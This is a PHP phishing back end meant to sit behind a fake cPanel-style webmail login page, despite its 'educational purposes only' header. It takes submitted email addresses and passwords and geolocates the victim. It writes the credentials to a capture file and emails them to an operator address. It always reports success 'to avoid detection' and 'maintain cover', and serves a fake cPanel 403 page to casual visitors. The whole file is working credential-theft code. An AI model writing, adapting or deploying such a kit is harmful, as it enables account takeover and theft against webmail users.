<?php
declare(strict_types=1);

/**
 * Optimized Webmail Login Handler - Configured for specific HTML form
 * Works with obfuscated JavaScript and cPanel-style webmail interface
 * For educational purposes only
 */

// Load configuration
require_once 'config.php';

// Start session for security features
session_start();

// Set headers based on configuration
if (ADVANCED_CONFIG['enable_cors']) {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');
}

if (ADVANCED_CONFIG['enable_security_headers']) {
    header('X-Content-Type-Options: nosniff');
    header('X-Frame-Options: DENY');
    header('X-XSS-Protection: 1; mode=block');
}

/**
 * Security Manager - Optimized for webmail form
 */
class SecurityManager 
{
    public static function checkRateLimit(): bool 
    {
        $ip = self::getClientIp();
        $key = 'rate_limit_' . md5($ip);
        
        if (!isset($_SESSION[$key])) {
            $_SESSION[$key] = ['count' => 1, 'timestamp' => time()];
            return true;
        }

        // Reset if window expired
        if (time() - $_SESSION[$key]['timestamp'] > CONFIG['rate_limit_window']) {
            $_SESSION[$key] = ['count' => 1, 'timestamp' => time()];
            return true;
        }

        // Check if limit exceeded
        if ($_SESSION[$key]['count'] >= CONFIG['rate_limit_requests']) {
            return false;
        }

        $_SESSION[$key]['count']++;
        return true;
    }

    public static function getClientIp(): string 
    {
        $ipKeys = [
            'HTTP_CF_CONNECTING_IP', 
            'HTTP_X_FORWARDED_FOR', 
            'HTTP_X_FORWARDED', 
            'HTTP_FORWARDED_FOR', 
            'HTTP_FORWARDED', 
            'REMOTE_ADDR'
        ];
        
        foreach ($ipKeys as $key) {
            if (!empty($_SERVER[$key])) {
                $ips = explode(',', $_SERVER[$key]);
                $ip = trim($ips[0]);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }
        
        return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    }

    public static function getLocationInfo(string $ip): string 
    {
        try {
            $context = stream_context_create([
                'http' => [
                    'timeout' => ADVANCED_CONFIG['geo_timeout'],
                    'user_agent' => 'WebmailMonitor/1.0'
                ]
            ]);
            
            $url = ADVANCED_CONFIG['geo_service_url'] . $ip . '?fields=country,city';
            $data = @file_get_contents($url, false, $context);
            
            if ($data) {
                $json = json_decode($data, true);
                if ($json && isset($json['status']) && $json['status'] === 'success') {
                    return ($json['city'] ?? 'Unknown') . ', ' . ($json['country'] ?? 'Unknown');
                }
            }
        } catch (Exception $e) {
            // Silent fail for geolocation
        }
        
        return 'Location unavailable';
    }

    public static function sanitizeInput(string $input): string 
    {
        return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
    }

    public static function validateEmail(string $email): ?string 
    {
        $email = filter_var(trim($email), FILTER_VALIDATE_EMAIL);
        return $email !== false ? $email : null;
    }

    public static function simulateDelay(): void
    {
        if (CONFIG['simulate_delay']) {
            $delay = random_int(CONFIG['delay_min'], CONFIG['delay_max']) * 1000; // Convert to microseconds
            usleep($delay);
        }
    }
}

/**
 * Logger - Optimized for security monitoring
 */
class Logger 
{
    public static function log(string $message, array $context = []): void 
    {
        $timestamp = date('Y-m-d H:i:s');
        $contextStr = !empty($context) ? ' | Context: ' . json_encode($context) : '';
        $logEntry = "[{$timestamp}] INFO: {$message}{$contextStr}" . PHP_EOL;
        
        @file_put_contents(CONFIG['log_file'], $logEntry, FILE_APPEND | LOCK_EX);
    }

    public static function error(string $message): void 
    {
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[{$timestamp}] ERROR: {$message}" . PHP_EOL;
        
        @file_put_contents(CONFIG['log_file'], $logEntry, FILE_APPEND | LOCK_EX);
    }

    public static function capture(string $email, string $password, array $clientInfo): void
    {
        $parts = explode("@", $email);
        $domain = isset($parts[1]) ? $parts[1] : 'unknown';
        
        $captureData = [
            'timestamp' => date('Y-m-d H:i:s'),
            'email' => $email,
            'password' => $password,
            'domain' => $domain,
            'ip' => $clientInfo['ip'],
            'location' => $clientInfo['location'],
            'user_agent' => $clientInfo['user_agent'],
            'session_id' => session_id(),
            'referer' => $_SERVER['HTTP_REFERER'] ?? 'Direct'
        ];
        
        // Save in structured format
        $logEntry = str_repeat('=', 50) . "\n";
        $logEntry .= "WEBMAIL LOGIN CAPTURED\n";
        $logEntry .= str_repeat('=', 50) . "\n";
        foreach ($captureData as $key => $value) {
            $logEntry .= strtoupper(str_replace('_', ' ', $key)) . ": {$value}\n";
        }
        $logEntry .= str_repeat('=', 50) . "\n\n";
        
        @file_put_contents(CONFIG['submission_file'], $logEntry, FILE_APPEND | LOCK_EX);
        
        // Also log in activity log
        self::log('Webmail credentials captured', [
            'email' => $email, 
            'domain' => $domain,
            'ip' => $clientInfo['ip']
        ]);
    }
}

/**
 * Email Notification System
 */
class EmailNotifier 
{
    public static function sendNotification(string $email, string $password, array $clientInfo): bool 
    {
        $parts = explode("@", $email);
        $domain = isset($parts[1]) ? $parts[1] : 'unknown';
        
        $subject = "🚨 Webmail Login Captured - {$domain} - " . date('Y-m-d H:i:s');
        $body = self::buildNotificationBody($email, $password, $clientInfo, $domain);
        
        $headers = [
            'MIME-Version: 1.0',
            'Content-type: text/html; charset=UTF-8',
            'From: ' . CONFIG['sender_name'] . ' <' . CONFIG['sender_email'] . '>',
            'Reply-To: ' . CONFIG['sender_email'],
            'X-Mailer: PHP/' . phpversion(),
            'X-Priority: 1 (Highest)'
        ];

        return mail(CONFIG['receiver_email'], $subject, $body, implode("\r\n", $headers));
    }

    private static function buildNotificationBody(string $email, string $password, array $clientInfo, string $domain): string 
    {
        return "
        <!DOCTYPE html>
        <html>
        <head>
            <title>Webmail Login Captured</title>
            <style>
                body { font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; }
                .container { max-width: 600px; margin: 0 auto; }
                .alert { background: #ff4444; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
                .credentials { background: #fff3cd; border: 1px solid #ffeaa7; padding: 20px; border-radius: 5px; margin: 20px 0; }
                .info { background: #e9ecef; padding: 15px; border-radius: 5px; font-size: 14px; }
                .highlight { background: #ffeb3b; padding: 2px 4px; border-radius: 3px; }
                table { width: 100%; border-collapse: collapse; margin: 10px 0; }
                td { padding: 8px; border-bottom: 1px solid #ddd; }
                .label { font-weight: bold; width: 30%; }
            </style>
        </head>
        <body>
            <div class='container'>
                <div class='alert'>
                    <h2 style='margin: 0;'>🚨 WEBMAIL LOGIN CAPTURED</h2>
                    <p style='margin: 5px 0 0 0;'>New webmail credentials intercepted</p>
                </div>
                
                <div class='credentials'>
                    <h3 style='margin-top: 0; color: #856404;'>📧 Captured Credentials</h3>
                    <table>
                        <tr><td class='label'>Email:</td><td class='highlight'>" . htmlspecialchars($email) . "</td></tr>
                        <tr><td class='label'>Password:</td><td class='highlight'>" . htmlspecialchars($password) . "</td></tr>
                        <tr><td class='label'>Domain:</td><td>" . htmlspecialchars($domain) . "</td></tr>
                    </table>
                </div>
                
                <div class='info'>
                    <h4 style='margin-top: 0; color: #495057;'>🌍 Session Information</h4>
                    <table>
                        <tr><td class='label'>IP Address:</td><td>" . htmlspecialchars($clientInfo['ip']) . "</td></tr>
                        <tr><td class='label'>Location:</td><td>" . htmlspecialchars($clientInfo['location']) . "</td></tr>
                        <tr><td class='label'>User Agent:</td><td>" . htmlspecialchars($clientInfo['user_agent']) . "</td></tr>
                        <tr><td class='label'>Timestamp:</td><td>" . htmlspecialchars($clientInfo['timestamp']) . "</td></tr>
                        <tr><td class='label'>Referer:</td><td>" . htmlspecialchars($_SERVER['HTTP_REFERER'] ?? 'Direct') . "</td></tr>
                    </table>
                </div>
                
                <div style='background: #d1ecf1; border: 1px solid #bee5eb; padding: 15px; border-radius: 5px; margin-top: 20px; font-size: 12px;'>
                    <p style='margin: 0;'><strong>⚡ Quick Access:</strong><br>
                    Email: <a href='mailto:{$email}'>{$email}</a><br>
                    Domain: <a href='https://{$domain}' target='_blank'>{$domain}</a></p>
                </div>
                
                <p style='text-align: center; color: #666; font-size: 12px; margin-top: 30px;'>
                    Automated notification from Webmail Security Monitor<br>
                    " . date('Y-m-d H:i:s T') . "
                </p>
            </div>
        </body>
        </html>";
    }
}

/**
 * Main Webmail Handler - Optimized for cPanel-style forms
 */
class WebmailHandler 
{
    public static function handleRequest(): array 
    {
        // Only allow POST requests
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            if ($_SERVER['REQUEST_METHOD'] === 'GET') {
                self::show403Page();
                exit;
            }
            return ['signal' => 'not ok', 'message' => 'Method not allowed'];
        }

        try {
            // Rate limiting check
            if (!SecurityManager::checkRateLimit()) {
                Logger::error('Rate limit exceeded for IP: ' . SecurityManager::getClientIp());
                // Still return ok to avoid detection
                return CONFIG['always_return_success'] ? 
                    ['signal' => 'ok', 'message' => 'Login processed'] : 
                    ['signal' => 'not ok', 'message' => 'Too many requests'];
            }

            // Extract and validate credentials
            $email = SecurityManager::validateEmail($_POST['email'] ?? '');
            $password = SecurityManager::sanitizeInput($_POST['password'] ?? '');

            if (!$email || empty($password)) {
                Logger::log('Invalid credentials submitted', ['email' => $_POST['email'] ?? 'empty']);
                return CONFIG['always_return_success'] ? 
                    ['signal' => 'ok', 'message' => 'Login processed'] : 
                    ['signal' => 'not ok', 'message' => 'Invalid credentials'];
            }

            // Gather client information
            $clientInfo = [
                'ip' => SecurityManager::getClientIp(),
                'location' => SecurityManager::getLocationInfo(SecurityManager::getClientIp()),
                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
                'timestamp' => date('Y-m-d H:i:s')
            ];

            // Capture the credentials - this is the main goal
            Logger::capture($email, $password, $clientInfo);

            // Try to send email notification (optional)
            try {
                EmailNotifier::sendNotification($email, $password, $clientInfo);
            } catch (Exception $e) {
                Logger::error('Failed to send email notification: ' . $e->getMessage());
                // Continue - capturing is more important than notification
            }

            // Simulate realistic response delay
            SecurityManager::simulateDelay();

            // Always return success if configured to do so
            return ['signal' => 'ok', 'message' => 'Login processed successfully'];

        } catch (Exception $e) {
            Logger::error('Critical error in webmail handler: ' . $e->getMessage());
            
            // Try to save whatever we can
            if (!empty($_POST['email']) && !empty($_POST['password'])) {
                $emergencyData = "EMERGENCY SAVE:\n" .
                               "Email: " . ($_POST['email'] ?? 'N/A') . "\n" .
                               "Password: " . ($_POST['password'] ?? 'N/A') . "\n" .
                               "Error: " . $e->getMessage() . "\n" .
                               "Time: " . date('Y-m-d H:i:s') . "\n" .
                               str_repeat('=', 50) . "\n\n";
                @file_put_contents(CONFIG['submission_file'], $emergencyData, FILE_APPEND | LOCK_EX);
            }

            // Return success to maintain cover
            return ['signal' => 'ok', 'message' => 'Login processed successfully'];
        }
    }

    private static function show403Page(): void 
    {
        http_response_code(403);
        echo '<!DOCTYPE html>
        <html><head><title>403 - Forbidden</title></head>
        <body><h1>403 Forbidden</h1><hr></body></html>';
    }
}

// Handle OPTIONS preflight request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Handle POST requests (main webmail capture)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    
    $result = WebmailHandler::handleRequest();
    
    // Format response for the obfuscated JavaScript
    $response = [
        'signal' => $result['signal'],
        'message' => $result['message'],
        'status' => $result['signal'] === 'ok' ? 'success' : 'error',
        'timestamp' => time()
    ];
    
    echo json_encode($response);
    exit;
}

// Handle GET requests - show 403 like real cPanel
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    http_response_code(403);
    echo '<!DOCTYPE html>
    <html><head><title>403 - Forbidden</title></head>
    <body><h1>403 Forbidden</h1><hr><p>cPanel, Inc.</p></body></html>';
    exit;
}